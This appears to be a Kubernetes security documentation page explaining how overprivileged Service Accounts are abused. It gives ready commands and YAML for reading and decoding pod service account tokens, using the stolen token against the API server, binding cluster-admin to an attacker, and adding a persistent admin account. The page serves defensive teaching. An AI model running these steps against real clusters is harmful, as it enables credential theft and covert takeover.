---
sidebar_position: 13
title: "Privileged Service Accounts"
description: "How attackers exploit overly privileged Kubernetes Service Accounts to gain cluster-wide access and escalate privileges."
---

# Privileged Service Accounts

**Service Accounts (SAs)** in Kubernetes provide pods with identities to interact with the cluster API. If **overprivileged**, these accounts can be exploited by attackers to **escalate privileges, manipulate cluster resources, or gain persistent access**.

---

## Exploitation Steps: Abusing Overprivileged Service Accounts

An attacker exploits **misconfigured Service Accounts** to gain unauthorized access to cluster resources.

### Step 1: Identify Overprivileged Service Accounts

The attacker lists available **Service Accounts**:

```bash
kubectl get serviceaccounts --all-namespaces
```

Next, they check for **excessive permissions**:

```bash
kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[].kind=="ServiceAccount")'
```

If a Service Account has **cluster-admin** privileges, it is a prime target.

### Step 2: Steal Service Account Tokens

If a pod is running with an overprivileged SA, the attacker accesses its token:

```bash
kubectl exec -it attacker-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token | base64 --decode
```

With this token, the attacker authenticates against the Kubernetes API:

```bash
export TOKEN=<stolen-token>
curl -H "Authorization: Bearer $TOKEN" https://<api-server>/api/v1/nodes
```

Now, the attacker can **perform API requests with elevated privileges**.

### Step 3: Escalate Privileges Using RBAC Misconfigurations

If a Service Account has **rolebinding privileges**, the attacker **grants themselves elevated permissions**:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: escalate-privileges
  namespace: default
subjects:
  - kind: User
    name: attacker
    apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
```

```bash
kubectl apply -f escalate-privileges.yaml
```

Now, the attacker has **cluster-wide administrative control**.

### Step 4: Maintain Persistence in the Cluster

The attacker creates a **new Service Account** with privileged access:

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: persistent-access
  namespace: default
```

Then, they bind it to **cluster-admin**:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: persist-access
subjects:
  - kind: ServiceAccount
    name: persistent-access
    namespace: default
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
```

```bash
kubectl apply -f persist-access.yaml
```

Even if the attacker's original access is revoked, this new **Service Account** ensures **ongoing control over the cluster**.

### Result

The attacker successfully **gained persistent access, escalated privileges, and took control over Kubernetes resources** through an insecure Service Account.

---

## Mitigation Steps

To protect against **privileged Service Account abuse**, follow the security best practices outlined in:

➡ **[Securing Kubernetes Service Accounts](/docs/best_practices/cluster_setup_and_hardening/service_account_mitigation)**

This guide covers techniques such as **restricting RBAC permissions, disabling automatic Service Account mounting, enforcing least privilege, and auditing Service Account usage** to prevent unauthorized access.
